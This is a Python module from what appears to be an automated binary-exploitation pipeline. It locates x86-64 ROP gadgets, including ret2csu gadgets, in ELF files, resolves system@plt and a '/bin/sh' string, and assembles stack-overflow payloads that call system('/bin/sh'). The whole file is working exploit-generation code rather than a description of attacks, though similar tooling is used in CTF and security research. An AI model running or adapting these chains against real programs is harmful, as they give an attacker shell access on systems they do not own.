"""ROP / ret2system chain synthesis (Phase 9 frontier, assisted).

For a no-PIE x86-64 binary without a convenient "win" function, build a return-oriented chain
that calls `system("/bin/sh")`: a `pop rdi; ret` gadget loads the argument, a "/bin/sh" string
from the image is the argument, and `system@plt` is the call target. Deterministic and pure
stdlib (an objdump assist resolves the PLT stub when available). The stage confirms the chain
by reaching `system` under a breakpoint with RDI pointing at "/bin/sh".
"""
from __future__ import annotations

import re
import shutil
import struct
import subprocess

# useful x86-64 gadget byte patterns (the VA of the match is the gadget address)
GADGETS = {
    "pop_rdi": b"\x5f\xc3",           # pop rdi ; ret
    "pop_rsi": b"\x5e\xc3",           # pop rsi ; ret
    "pop_rdx": b"\x5a\xc3",           # pop rdx ; ret
    "ret": b"\xc3",                   # ret (stack alignment)
    "pop_rsi_r15": b"\x5e\x41\x5f\xc3",  # pop rsi ; pop r15 ; ret (libc_csu)
}


def _loads(data):
    """PT_LOAD segments as (file_off, filesz, vaddr, flags)."""
    if len(data) < 64 or data[:4] != b"\x7fELF" or data[4] != 2:
        return []
    endc = "<" if data[5] == 1 else ">"
    e_phoff = struct.unpack_from(endc + "Q", data, 32)[0]
    e_phentsize, e_phnum = struct.unpack_from(endc + "HH", data, 54)
    out = []
    for i in range(e_phnum):
        o = e_phoff + i * e_phentsize
        if o + e_phentsize > len(data):
            break
        p_type, p_flags = struct.unpack_from(endc + "II", data, o)
        p_offset = struct.unpack_from(endc + "Q", data, o + 8)[0]
        p_vaddr = struct.unpack_from(endc + "Q", data, o + 16)[0]
        p_filesz = struct.unpack_from(endc + "Q", data, o + 32)[0]
        if p_type == 1:                                # PT_LOAD
            out.append((p_offset, p_filesz, p_vaddr, p_flags))
    return out


def _va_of(segs, file_off, need_x=False):
    for off, sz, va, flags in segs:
        if off <= file_off < off + sz and (not need_x or (flags & 1)):
            return va + (file_off - off)
    return None


def _find_exec(data: bytes, pat: bytes):
    segs = _loads(data)
    for off, sz, _va, flags in segs:
        if not (flags & 1):                            # executable segments only
            continue
        idx = data.find(pat, off, off + sz)
        if idx >= 0:
            return _va_of(segs, idx, need_x=True)
    return None


def find_gadget(data: bytes, name: str):
    """VA of the first occurrence of gadget `name` in an executable segment, or None."""
    pat = GADGETS.get(name)
    return _find_exec(data, pat) if pat else None


# __libc_csu_init gadgets (present in ELF binaries built against pre-glibc-2.34 startup and in
# many firmware/legacy targets). The pop gadget loads rbx/rbp/r12/r13/r14/r15; the call gadget
# does rdx=r15; rsi=r14; edi=r13d; call [r12+rbx*8] -- a full 3-argument controlled call.
CSU_POP = bytes([0x5b, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc3])
CSU_CALL = bytes([0x4c, 0x89, 0xfa, 0x4c, 0x89, 0xf6, 0x44, 0x89, 0xef, 0x41, 0xff, 0x14, 0xdc])


def find_csu(data: bytes):
    """{'pop': va, 'call': va} for the __libc_csu_init ret2csu gadgets, or None."""
    pop = _find_exec(data, CSU_POP)
    call = _find_exec(data, CSU_CALL)
    return {"pop": pop, "call": call} if pop and call else None


def build_ret2csu(offset, pop, call, ptr, edi, rsi, rdx, length, rbx=0, rbp=0):
    """ret2csu chain: pop-gadget loads rbx/rbp/r12=ptr/r13=edi/r14=rsi/r15=rdx, then the
    call-gadget does the 3-arg call *[ptr+rbx*8]."""
    body = bytearray(_cyclic(offset))
    for w in (pop, rbx, rbp, ptr, edi, rsi, rdx, call):
        body += struct.pack("<Q", w & 0xFFFFFFFFFFFFFFFF)
    body += b"C" * 64                                  # post-call padding (breakpoint fires first)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


def find_string(data: bytes, s: bytes):
    """VA of byte string `s` (NUL-terminated form preferred) in a loaded segment, or None."""
    segs = _loads(data)
    for probe in (s + b"\x00", s):
        for off, sz, _va, _fl in segs:
            idx = data.find(probe, off, off + sz)
            if idx >= 0:
                return _va_of(segs, idx)
    return None


def resolve_plt(exe_path, name: str):
    """Address of `<name@plt>` via objdump, or None (objdump absent / symbol not called)."""
    if not shutil.which("objdump"):
        return None
    try:
        out = subprocess.run(["objdump", "-d", "--no-show-raw-insn", str(exe_path)],
                             capture_output=True, timeout=60, check=False).stdout.decode(
                                 "latin-1", "ignore")
    except (OSError, subprocess.SubprocessError):
        return None
    m = re.search(r"^0*([0-9a-fA-F]+)\s+<" + re.escape(name) + r"(?:@plt)?>:", out, re.M)
    return int(m.group(1), 16) if m else None


def build_ret2system(offset: int, pop_rdi: int, binsh: int, system: int, length: int,
                     ret_gadget=None) -> bytes:
    """cyclic filler, then: [ret align] ; pop rdi ; &"/bin/sh" ; system."""
    body = bytearray(_cyclic(offset))
    chain = []
    if ret_gadget:
        chain.append(ret_gadget)                       # 16-byte stack alignment for movaps
    chain += [pop_rdi, binsh, system]
    for word in chain:
        body += struct.pack("<Q", word & 0xFFFFFFFFFFFFFFFF)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


def _cyclic(n):
    from .primitive import cyclic
    return cyclic(n)
